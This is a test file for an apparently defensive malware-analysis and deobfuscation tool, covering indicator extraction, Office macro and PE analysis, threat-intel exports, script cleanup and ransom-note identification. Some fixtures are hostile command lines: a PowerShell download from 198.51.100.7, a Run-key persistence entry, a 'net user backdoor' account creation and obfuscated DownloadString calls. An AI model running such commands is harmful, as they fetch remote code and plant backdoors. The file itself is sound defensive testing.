/**
 * Tests for the analyst features: crypto-address checksums (published test vectors), Office macro
 * extraction (real samples, compared with the olevba output that ships with one of them), PE
 * analysis (compared with pefile when Python has it), exports (validated with the reference
 * libraries when installed), script cleanup, team library, plugins and ransom-note identification.
 *
 *   node test/features/run-features.mjs
 *
 * Optional reference tools (checks are skipped, and say so, when missing):
 *   pip install pefile stix2 pysigma yara-python pymisp
 *   the real-world sample cache (npm run test:realworld downloads it)
 */
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.join(HERE, "..", "..");
process.env.AUTOCHEF_LIBRARY = path.join(os.tmpdir(), `autochef-team-test-${process.pid}.json`);
const { cryptoAddresses, extractFindings } = await import("../../src/findings.mjs");
const { extractOffice } = await import("../../src/office.mjs");
const { analyzePE } = await import("../../src/pe.mjs");
const { cleanPowerShell, cleanVBA, cleanJavaScript } = await import("../../src/cleanup.mjs");
const { saveTeamEntry, teamLibraryInfo, deleteTeamEntry, teamCandidates } = await import("../../src/library.mjs");
const { loadPlugins, pluginFindings } = await import("../../src/plugins.mjs");
const { identifyRansom } = await import("../../src/ransom.mjs");
const { autoChef, buildReport } = await import("../../src/index.mjs");

let pass = 0, fail = 0, skip = 0;
const ok = (name, cond, extra = "") => { console.log(`${cond ? "PASS" : "FAIL"}  ${name}${extra ? "  " + extra : ""}`); cond ? pass++ : fail++; };
const skipped = (name, why) => { console.log(`SKIP  ${name}  (${why})`); skip++; };
const py = (code, ...args) => execFileSync("python3", ["-c", code, ...args], { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });
const hasPy = mod => { try { py(`import ${mod}`); return true; } catch { return false; } };

// ---------- 1. cryptocurrency addresses: published vectors ----------
const VALID = [
    ["1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "Bitcoin (P2PKH)"],                   // genesis block address
    ["3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy", "Bitcoin (P2SH)"],                    // BIP-13 era example (bitcoin wiki)
    ["bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4", "Bitcoin (SegWit/Taproot)"],  // BIP-173 test vector
    ["bc1p0xlxvlhemja6c4dqv22uapctqupfhlxm9h8z3k2e72q4k9hcz7vqzk5jj0", "Bitcoin (SegWit/Taproot)"], // BIP-350 test vector
    ["0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe", "Ethereum"],                  // EIP-55 checksummed example
    ["0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAed", "Ethereum"],                  // EIP-55 specification vector
    ["bitcoincash:qpm2qsznhks23z7629mms6s4cwef74vcwvy22gdx6a", "Bitcoin Cash"],  // CashAddr spec vector
    ["44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A", "Monero (XMR)"], // Monero general fund
    ["rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh", "XRP"],                               // XRPL genesis account
    ["GAAZI4TCR3TY5OJHCTJC2A4QSY6CJWJH5IAJTGKIN2ER7LBNVKOCCWN7", "Stellar"],     // SEP-23 example
];
for (const [a, coin] of VALID) { const r = cryptoAddresses(`pay to ${a} now`); ok(`crypto: ${coin} ${a.slice(0, 14)}… recognised`, r.some(x => x.address === a && x.coin.startsWith(coin.split(" ")[0]))); }
const BROKEN = ["1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNb", "bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t5", "0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAE",
    "bitcoincash:qpm2qsznhks23z7629mms6s4cwef74vcwvy22gdx6b", "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3B"];
for (const a of BROKEN) ok(`crypto: one wrong character rejected ${a.slice(0, 14)}…`, !cryptoAddresses(a).some(x => x.address === a));

// ---------- 2. findings ----------
const F = extractFindings(`powershell.exe -c iwr http://198.51.100.7/a.ps1 -OutFile $env:TEMP\\p.ps1; reg add HKCU\\Software\\Run /v x; net user backdoor P@ss /add; mail to bad@example.org; +44 20 7946 0958; Germany; 5d41402abc4b2a76b9719d911017c592`);
const has = (type, value) => F.some(f => f.type === type && (!value || f.value === value));
ok("findings: URL, IP, process, registry, user, e-mail, phone, country, hash", has("URL", "http://198.51.100.7/a.ps1") && has("IPv4 address", "198.51.100.7") && has("Process", "powershell.exe") && has("Registry path") && has("User name", "backdoor") && has("Email address") && has("Landline") && has("Country", "Germany") && has("MD5 / NTLM hash"));
ok("findings: certificate hosts are info, not alerts", extractFindings("http://crl.sectigo.com/x.crl").every(f => f.level === "info"));

// ---------- 3. Office macros (real samples from the CyberChef Recipes collection) ----------
const CACHE = path.join(ROOT, "test", "realworld", ".cache", "cyberchef-recipes", "source_files");
if (fs.existsSync(path.join(CACHE, "recipe_53.zip"))) {
    const { ZipReader, BlobReader, Uint8ArrayWriter } = await import("@zip.js/zip.js");
    const unzip = async (bytes, pw = "infected") => { const out = []; for (const e of await new ZipReader(new BlobReader(new Blob([bytes])), { password: pw }).getEntries()) if (!e.directory) out.push({ name: e.filename, data: Buffer.from(await e.getData(new Uint8ArrayWriter())) }); return out; };
    const s53 = await unzip(fs.readFileSync(path.join(CACHE, "recipe_53.zip")));
    const olevba = s53.find(f => /olevba/.test(f.name)).data.toString("utf8");
    const doc = (await unzip(s53.find(f => /\.zip$/.test(f.name)).data))[0].data;
    const x = await extractOffice(doc);
    const lines = x.text.split(/\r?\n/).map(l => l.trim()).filter(l => l.length > 20 && !l.startsWith("'"));
    ok("office: .xlsm VBA source identical to the olevba output shipped with the sample", lines.length > 100 && lines.every(l => olevba.includes(l)), `${x.modules.length} modules, ${lines.length} lines compared`);
    const s33 = await unzip(fs.readFileSync(path.join(CACHE, "recipe_33.zip")));
    const x33 = await extractOffice(s33.find(f => /\.doc$/.test(f.name)).data);
    ok("office: OLE .doc (Emotet) macros + payload string in WordDocument stream", x33.modules.length === 3 && x33.payloads.some(p => /=PO32/.test(p.text)));
    const s34 = await unzip(fs.readFileSync(path.join(CACHE, "recipe_34.zip")));
    const x34 = await extractOffice(s34[0].data);
    ok("office: remote template link in .docx relationships", x34.embedded.some(e => e.kind === "external link" && /^http/.test(e.value)));
} else skipped("office extraction on real samples", "sample cache missing: run npm run test:realworld once");

// ---------- 4. PE analysis vs pefile ----------
const peFile = process.env.AUTOCHEF_TEST_PE || ["C:\\Windows\\System32\\notepad.exe", "/tmp/pe/putty.exe"].find(f => fs.existsSync(f));
if (peFile && hasPy("pefile")) {
    const mine = analyzePE(fs.readFileSync(peFile));
    const ref = JSON.parse(py("import pefile,json,sys; p=pefile.PE(sys.argv[1]); print(json.dumps({'imphash':p.get_imphash(),'ep':hex(p.OPTIONAL_HEADER.AddressOfEntryPoint),'secs':[s.Name.rstrip(b'\\0').decode('latin1') for s in p.sections],'dlls':[e.dll.decode() for e in getattr(p,'DIRECTORY_ENTRY_IMPORT',[])]}))", peFile));
    ok(`pe: imphash, entry point, sections and DLLs equal pefile's (${path.basename(peFile)})`, mine.imphash === ref.imphash && mine.entryPoint === ref.ep && mine.sections.map(s => s.name).join() === ref.secs.join() && mine.imports.map(i => i.dll).join() === ref.dlls.join(), mine.imphash);
} else skipped("pe analysis vs pefile", "set AUTOCHEF_TEST_PE to a .exe and pip install pefile");

// ---------- 5. exports validated by reference libraries ----------
const sample = new Uint8Array(Buffer.from(Buffer.from("powershell.exe -c iwr http://198.51.100.7/a.ps1; reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x; pay 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa; 5d41402abc4b2a76b9719d911017c592").toString("base64")));
const an = await autoChef(sample, { timeBudgetMs: 4000 });
const tmp = n => path.join(os.tmpdir(), `autochef-${process.pid}-${n}`);
const checks = [
    ["stix", "stix2", "import stix2,sys; b=stix2.parse(open(sys.argv[1]).read(), allow_custom=False); print(len(b.objects))"],
    ["misp", "pymisp", "import sys; from pymisp import MISPEvent; e=MISPEvent(); e.load_file(sys.argv[1]); print(len(e.attributes))"],
    ["sigma", "sigma", "import sys; from sigma.collection import SigmaCollection; c=SigmaCollection.from_yaml(open(sys.argv[1]).read()); print(len(c.rules))"],
    ["yara", "yara", "import yara,sys; yara.compile(sys.argv[1]); print('ok')"],
];
for (const [fmt, mod, code] of checks) {
    fs.writeFileSync(tmp(fmt), buildReport({ name: "s.txt", bytes: sample, analysis: an }, fmt));
    if (!hasPy(mod)) { skipped(`export ${fmt}`, `pip install ${mod === "sigma" ? "pysigma" : mod === "yara" ? "yara-python" : mod}`); continue; }
    try { const out = py(code, tmp(fmt)).trim(); ok(`export ${fmt}: accepted by ${mod}`, !!out, out); } catch (e) { ok(`export ${fmt}: accepted by ${mod}`, false, String(e.stderr || e.message).slice(-200)); }
}

// ---------- 6. script cleanup ----------
ok("cleanup: PowerShell -f operator, concatenation, [char], backticks, case",
    cleanPowerShell(`$x = n\`e\`w-o\`bje\`ct ('Net.'+'WebClient'); sEt-iTeM ("{1}{0}" -f 'Item','Path'); $x.DownloadString([char]104+'ttp://a')`)
        .includes("New-Object 'Net.WebClient'") && cleanPowerShell(`sEt-iTeM ("{1}{0}" -f 'Item','Path')`).includes("Set-Item 'PathItem'") && cleanPowerShell(`$x.DownloadString([char]104+'ttp://a')`).includes("DownloadString('http://a')"));
ok("cleanup: VBA Chr() and & joins", cleanVBA(`x = Chr(112) & Chr(111) & "wer" & "shell"`).includes(`"powershell"`));
ok("cleanup: JavaScript constant folding", ((await cleanJavaScript(`var a=["\\x68\\x69","wor"+"ld"];`)) || "").includes(`"world"`));

// ---------- 7. team library ----------
const e = saveTeamEntry({ name: "test filler", detect: ["=PO32"], recipe: [{ op: "Find / Replace", args: [{ option: "Simple string", string: "=PO32" }, "", true, false, true, false] }] });
ok("team library: saved, matched by its pattern, ignored otherwise", teamLibraryInfo().entries.some(x => x.id === e.id) && teamCandidates("aa=PO32bb").length === 1 && teamCandidates("nothing").length === 0);
ok("team library: deleted", deleteTeamEntry(e.id) && !teamLibraryInfo().entries.length);
try { fs.unlinkSync(process.env.AUTOCHEF_LIBRARY); } catch { /* not created */ }

// ---------- 8. plugins ----------
await loadPlugins();
ok("plugin exfil-channels: Telegram bot token and Discord webhook", (() => { const f = pluginFindings("1234567890:AAH9xk2PqL5mZ0vT7bW3cR8sD1fG6jN4eYu https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghij1234"); return f.some(x => x.type === "Telegram bot token") && f.some(x => x.type === "Discord webhook"); })());

// ---------- 9. ransom notes ----------
const notes = process.env.AUTOCHEF_TEST_NOTES || "/tmp/rn";
if (fs.existsSync(path.join(notes, "akira"))) {
    const t = fs.readFileSync(path.join(notes, "akira", "akira_readme.txt"), "utf8");
    const r = identifyRansom(t);
    ok("ransom: Akira note identified, decryptor link given", r && r.families[0].family === "akira" && !!r.families[0].decryptor);
} else skipped("ransom note identification", "set AUTOCHEF_TEST_NOTES to a clone of github.com/ThreatLabz/ransomware_notes");
ok("ransom: ordinary text is not a ransom note", identifyRansom("This is an ordinary README file describing how to build the project and run the tests. Nothing else here.") === null);

// ---------- 10. Unicode code-point offset and byte-arithmetic layers (Fortra FIRE, five-layer fileless loader) ----------
// Layer 5 of that campaign stores every byte as the CJK character U+4E00 + byte; layer 2 is "byte - 65, reversed";
// layer 3 is "(byte - key[i % 16]) & 255" over a Base64 loader. Plaintexts are real Atomic Red Team commands.
{
    const top = async (input, ms = 8000) => (await autoChef(Buffer.isBuffer(input) ? input : Buffer.from(input), { timeBudgetMs: ms })).results[0];
    const outText = r => r ? Buffer.from(r.output.base64, "base64").toString("latin1") : "";
    const cjk = "乄久乔久乃乔义乏乎也乔久乓乔乼乳乴乡乧乥丽丵乼乡乣乴乩乯乮丽乮乯乮乥";
    ok("code-point offset: CJK U+4E00 + byte (user-reported case)", outText(await top(cjk)) === "DETECTION_TEST|stage=5|action=none");
    const art = JSON.parse(fs.readFileSync(path.join(ROOT, "test", "corpus", "art-commands.json"), "utf8"));
    const cmd = art.find(x => x.command && x.command.length > 120 && /powershell/i.test(x.command)).command;
    const B = Buffer.from(cmd);
    const enc = (buf, base) => Array.from(buf, b => String.fromCodePoint(base + b)).join("");
    const head = cmd.slice(0, 40);
    for (const [name, input] of [
        ["offset 0x4EC0 (crosses a 256 boundary)", enc(B, 0x4EC0)],
        ["Hangul offset 0xAC00", enc(B, 0xAC00)],
        ["CJK offset over Base64", enc(Buffer.from(B.toString("base64")), 0x4E00)],
        ["byte - 65, reversed, as a decimal array (Fortra layer 2)", Buffer.from(B.map(x => (x - 65) & 255)).reverse().join(",")],
        ["(byte - 16-byte key) & 255 over Base64, decimal array (Fortra layer 3)", (k => Array.from(Buffer.from(B.toString("base64")), (x, i) => (x - k[i % 16]) & 255).join(","))(Buffer.from("7c1fa20b9e44d03a5b6e81f2c7093d5e", "hex"))],
    ]) { const r = await top(input, 12000); ok(`layers: ${name}`, outText(r).startsWith(head), r ? r.recipe.map(o => o.op).join(" > ") : "no result"); }
    // natural text in scripts that fit one 256-code-point window must not be "decoded"
    for (const [name, t] of [
        ["Japanese (Iroha poem, hiragana)", "いろはにほへとちりぬるをわかよたれそつねならむうゐのおくやまけふこえてあさきゆめみしゑひもせす"],
        ["Thai without spaces", "ประเทศไทยมีพระมหากษัตริย์ทรงเป็นประมุข"],
        ["Chinese", "我们都是中国人我们爱我们的国家"],
        ["Korean", "대한민국은민주공화국이다"],
        ["Russian", "Привет"],
    ]) { const a = await autoChef(Buffer.from(t), { timeBudgetMs: 5000 }); ok(`natural ${name} is readable text, not decoded`, !a.results.length && !!a.input.info.script, a.results[0] ? a.results[0].recipe.map(o => o.op).join(" > ") : a.input.info.script); }
}

console.log(`\n${pass} passed, ${fail} failed, ${skip} skipped`);
process.exit(fail ? 1 : 0);
